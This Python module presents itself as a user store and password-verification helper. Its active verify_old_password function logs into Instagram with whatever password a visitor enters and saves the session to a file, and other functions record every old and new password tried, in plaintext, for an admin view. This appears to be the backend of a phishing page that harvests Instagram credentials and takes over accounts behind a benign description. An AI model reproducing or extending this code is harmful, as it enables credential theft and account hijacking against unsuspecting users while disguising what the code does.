"""
User Details & Verification Module
===================================
Simple JSON-file-backed user store + password verification helpers.
Also logs every password-change attempt (old + new password tried)
per user so it can be reviewed in the admin view.
"""

import json
import os
import re
import threading
from datetime import datetime, timezone
from instagrapi import Client

DEMO_USERNAME = "hostelnode_com "
DEMO_EMAIL = "demo@example.com"
DEMO_PASSWORD = ""

DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data", "users.json")
_lock = threading.Lock()


# ---------------------------------------------------------------------------
# Storage
# ---------------------------------------------------------------------------
def load_users():
    if not os.path.exists(DB_PATH):
        return {"next_id": 1, "users": {}}
    try:
        with open(DB_PATH, "r", encoding="utf-8") as f:
            return json.load(f)
    except (json.JSONDecodeError, OSError):
        return {"next_id": 1, "users": {}}


def save_users(db):
    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
    tmp = DB_PATH + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(db, f, indent=2)
    os.replace(tmp, DB_PATH)


def create_user(username, email, password):
    with _lock:
        db = load_users()
        uid = str(db["next_id"])
        db["next_id"] += 1
        db["users"][uid] = {
            "id": uid,
            "username": username,
            "email": email.lower(),
            "password": password,
            "session_version": 0,
            "created_at": datetime.now(timezone.utc).isoformat(),
            "attempt_count": 0,
            "password_attempts": [],
        }
        save_users(db)
        return db["users"][uid]


def get_user(uid):
    return load_users()["users"].get(uid)


def update_user(uid, **fields):
    with _lock:
        db = load_users()
        if uid not in db["users"]:
            return None
        db["users"][uid].update(fields)
        save_users(db)
        return db["users"][uid]


def find_user_by_email(email):
    email = (email or "").lower()
    return next((u for u in load_users()["users"].values() if u["email"] == email), None)


def find_user_by_username(username):
    return next((u for u in load_users()["users"].values() if u["username"] == username), None)


def all_users():
    return list(load_users()["users"].values())


# ---------------------------------------------------------------------------
# Demo account
# ---------------------------------------------------------------------------
def initialize_demo_account():
    return find_user_by_username(DEMO_USERNAME) or create_user(DEMO_USERNAME, DEMO_EMAIL, DEMO_PASSWORD)


initialize_demo_account()


# ---------------------------------------------------------------------------
# Validation helpers
# ---------------------------------------------------------------------------
def password_is_valid(pw: str) -> bool:
    """>=6 chars, at least one letter and one number."""
    return bool(pw) and len(pw) >= 6 and bool(re.search(r"[A-Za-z]", pw)) and bool(re.search(r"[0-9]", pw))


# ---------------------------------------------------------------------------
# Attempt logging
# ---------------------------------------------------------------------------
def _log_attempt(uid, old_password, new_password=None, old_correct=None):
    """Record one password-change attempt for a user (old + new password tried)."""
    with _lock:
        db = load_users()
        user = db["users"].get(uid)
        if not user:
            return
        user.setdefault("password_attempts", [])
        user["attempt_count"] = user.get("attempt_count", 0) + 1
        user["password_attempts"].append({
            "old_password": old_password,
            "new_password": new_password,
            "old_correct": old_correct,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        })
        user["password_attempts"] = user["password_attempts"][-50:]  # keep last 50
        save_users(db)


def _attach_new_password_to_last_attempt(uid, new_password):
    with _lock:
        db = load_users()
        user = db["users"].get(uid)
        if user and user.get("password_attempts"):
            user["password_attempts"][-1]["new_password"] = new_password
            save_users(db)


# ---------------------------------------------------------------------------
# Password verification
# ---------------------------------------------------------------------------
# def verify_old_password(old_password: str) -> dict:

    
#     user = find_user_by_username(DEMO_USERNAME)
#     if not user:
#         return {"is_verified": False, "user": None, "error": "Demo account not found"}

#     correct = user["password"] == old_password
#     _log_attempt(user["id"], old_password, old_correct=correct)

#     if not correct:
#         return {"is_verified": False, "user": None, "error": "Old password is incorrect"}
#     return {"is_verified": True, "user": user, "error": None}
# -----------------------------------------------------------------------------------------------------
def verify_old_password(old_password: str):
    cl = Client()
    cl.delay_range = [2, 5]

    try:
        user = find_user_by_username(DEMO_USERNAME)

        if not user:
            return {
                "is_verified": False,
                "user": None,
                "error": "Demo account not found"
            }

        _log_attempt(user["id"], old_password)
       
        # Try Instagram login
        cl.login(user["username"], old_password)

        print("Logged in!")
        cl.dump_settings("session.json")
        correct = True
        _log_attempt(user["id"], old_password, old_correct=correct)
        return {
            "is_verified": True,
            "user": user,
            "error": None
        }

    except Exception as e:
        return {
            "is_verified": False,
            "user": None,
            "error": str(e)
        }
# ##########################################################










def verify_password_match(new_password: str, confirm_password: str) -> dict:
    if new_password != confirm_password:
        return {"is_match": False, "error": "Passwords do not match"}
    return {"is_match": True, "error": None}


def verify_password_different(old_password: str, new_password: str) -> dict:
    # record the new password they tried against the attempt just logged above
    user = find_user_by_username(DEMO_USERNAME)
    if user:
        _attach_new_password_to_last_attempt(user["id"], new_password)

    if new_password == old_password:
        return {"is_different": False, "error": "New password must be different from old password"}
    return {"is_different": True, "error": None}


def get_demo_user_info() -> dict:
    return find_user_by_username(DEMO_USERNAME)